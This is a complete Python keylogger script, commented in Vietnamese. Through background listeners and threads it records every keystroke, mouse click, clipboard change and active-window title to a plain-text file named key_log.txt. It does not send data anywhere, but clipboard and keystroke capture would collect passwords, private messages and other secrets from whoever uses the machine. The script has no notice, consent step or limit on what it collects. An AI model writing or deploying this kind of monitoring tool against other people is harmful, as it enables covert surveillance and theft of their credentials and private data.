from pynput import keyboard, mouse
import os
import time
import threading
import pyperclip
import pygetwindow as gw

log_file = "key_log.txt"
log_lock = threading.Lock()


# Ghi log an toàn đa luồng
def write_log(data):
    with log_lock:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(data + "\n")


# === Bàn phím ===
def on_press(key):
    try:
        write_log(f"Key: {key.char}")
    except AttributeError:
        write_log(f"Key: [{key}]")

# === Chuột ===
def on_click(x, y, button, pressed):
    if pressed:
        write_log(f"Mouse clicked at ({x}, {y}) with {button}")

# === Clipboard ===
def clipboard_monitor():
    old = ""
    while True:
        try:
            data = pyperclip.paste()
            if data != old:
                write_log(f"Clipboard: {data}")
                old = data
        except:
            pass
        time.sleep(1)

# === Active Window ===
def window_monitor():
    last_title = ""
    while True:
        try:
            win = gw.getActiveWindow()
            if win and win.title != last_title:
                write_log(f"Active window: {win.title}")
                last_title = win.title
        except:
            pass
        time.sleep(1)


# === Khởi chạy ===
if __name__ == "__main__":
    # Bắt phím
    kb_listener = keyboard.Listener(on_press=on_press)
    kb_listener.start()

    # Bắt chuột
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    # Clipboard & window monitor chạy riêng
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=window_monitor, daemon=True).start()

    kb_listener.join()
    mouse_listener.join()
